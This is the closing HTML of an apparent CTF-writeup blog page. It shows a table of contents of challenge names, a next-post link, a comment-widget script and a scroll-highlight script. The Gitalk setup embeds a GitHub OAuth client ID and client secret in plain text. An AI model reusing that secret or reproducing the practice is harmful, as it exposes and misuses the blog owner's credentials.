+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#%E7%AD%BE%E5%88%B0%E9%A2%98">签到题</a></li>
+<li><a href="#login">Login</a></li>
+</ul>
+</li>
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#weblog">weblog</a></li>
+</ul>
+</li>
+<li><a href="#re">Re</a>
+<ul>
+<li><a href="#xor_exercise">XOR_Exercise</a></li>
+<li><a href="#lithops">Lithops</a></li>
+</ul>
+</li>
+<li><a href="#cry">Cry</a>
+<ul>
+<li><a href="#gege">GeGe</a></li>
+</ul>
+</li>
+<li><a href="#pwn">Pwn</a>
+<ul>
+<li><a href="#find-flag">find-flag</a></li>
+<li><a href="#write_book">write_book</a></li>
+<li><a href="#create_code">create_code</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/陇原战疫2021网络安全大赛_我真的好饿！/">
+              <h3 class="post-title">
+                陇原战&#34;疫&#34;2021网络安全大赛Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
